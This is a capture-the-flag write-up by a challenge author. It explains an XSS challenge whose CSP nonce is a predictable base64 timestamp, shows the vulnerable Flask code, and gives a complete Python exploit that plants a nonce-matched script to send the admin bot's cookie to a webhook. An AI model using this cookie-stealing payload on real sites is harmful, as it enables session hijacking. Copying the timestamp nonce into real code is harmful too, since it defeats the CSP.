The challenge is a XSS challenge with some CSP implementation. The web application involved has some simple features of creating a note, viewing it and reporting a note to the admin bot. The main aim is to steal the admin bot cookie. On analyzing the code, we can observe that the csp header is being added in the response allows only the scripts with nonce equal to the base64 encoded timestamp of current epoch time. 
```
def generate_nonce():
    timestamp = int(time.time()) // 1
    return base64.b64encode(str(timestamp).encode()).decode()

@app.before_request
def set_nonce():
    g.nonce = generate_nonce()

@app.context_processor
def inject_nonce():
    return dict(nonce=g.nonce)

@app.after_request
def add_csp(response):
    response.headers["Content-Security-Policy"] = f"default-src 'self' script-src 'nonce-{g.nonce}'"
    return response
```
Since the timestamp is integer divided by 1 so the timestamp is changing every second hence it is not possible to manually send a request with the correct nonce. So we need a automated script to do that. 
```
import requests, re
mysession = requests.Session()
BASE = 'http://127.0.0.1:5000'
BIN = '{link-of-your-webhook}'
mysession.post(f'{BASE}/register', data={'username':'u','password':'p'})
mysession.post(f'{BASE}/login', data={'username':'u','password':'p'})
header = mysession.get(f'{BASE}/create').headers['Content-Security-Policy']
nonce = re.search(r"script-src 'nonce-([^']+)'", header).group(1)
payload = f'''<script nonce="{nonce}">
              setTimeout(() => {{
              console.log("Cookie in DOM:", document.cookie);
              location = "{BIN}/?c=" + document.cookie;
              }}, 1000);
              </script>
            '''
mysession.post(f'{BASE}/create', data={'content': payload})
dash = mysession.get(f'{BASE}/dashboard').text
notes = re.findall(r'href="(/note\?Note=\d+)"', dash)
note = notes[-1]
note_url = 'http://app:5000' + note
mysession.post(
    f'{BASE}/report',
    data={
      'note_url': note_url,
      'submit':    'Report Note'
    }
)
print("Exploit sent.")
```
The script basically registers and logs in with some specified username and password. After that it reads the CSP header of /create page and use the nonce to first create a note containing the payload with the correct nonce and then send a post request to /report endpoint. Just as the bot visits our url, script will get executed and we will receive the cookie on our webhook.

The main intent of the challenge was to just check the code comprehension ability of the players and to check their skills in writing a working exploit script.
Since this was my first challenge, I did make a simple challenge to gain hands over challenge creation and I will try my best to make some better challenges in future.
